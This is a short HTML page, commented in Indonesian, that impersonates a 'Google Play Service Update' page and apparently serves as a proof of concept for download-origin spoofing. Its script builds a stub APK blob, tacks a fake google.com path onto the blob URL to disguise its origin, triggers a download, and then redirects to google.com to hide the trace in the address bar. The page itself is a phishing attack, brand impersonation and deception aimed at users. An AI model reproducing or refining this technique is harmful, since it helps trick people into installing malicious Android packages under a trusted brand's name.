<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security</title>
</head>
<body style="background:#f1f3f4; text-align:center; padding-top:50px;">
    <h2>Google Play Service Update</h2>
    <button id="pwnBtn" style="padding:15px; background:#1a73e8; color:white; border:none; border-radius:5px;">UPDATE NOW</button>

<script>
    document.getElementById('pwnBtn').addEventListener('click', function() {
        const spoofDomain = "www.google.com";
        
        // 1. Buat konten file palsu
        const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]);
        const blob = new Blob([content], {type: "application/vnd.android.package-archive"});
        
        // 2. Gunakan URL.createObjectURL
        const blobUrl = URL.createObjectURL(blob);
        
        // 3. Gunakan karakter spesial untuk menyamarkan 'blob:https://'
        // Kita gunakan %00 (Null Byte) atau %0A (Newline) jika didukung
        const padding = " ".repeat(500); 
        const fakeOrigin = "https://" + spoofDomain + "/update-verification-system-v2026/";
        
        // 4. TEKNIK INTI: Navigasi Langsung
        // Alih-alih 'download', kita arahkan window ke blob tersebut.
        // Chrome akan melihat ini sebagai navigasi ke file, lalu memicu dialog download.
        const finalUrl = blobUrl + "#" + fakeOrigin;

        // Buka di jendela baru atau tab ini
        window.location.href = finalUrl;

        // Redirect ke google asli setelah jeda untuk menutupi jejak di address bar
        setTimeout(() => {
            window.location.replace("https://www.google.com");
        }, 800);
    });
</script>
</body>
</html>
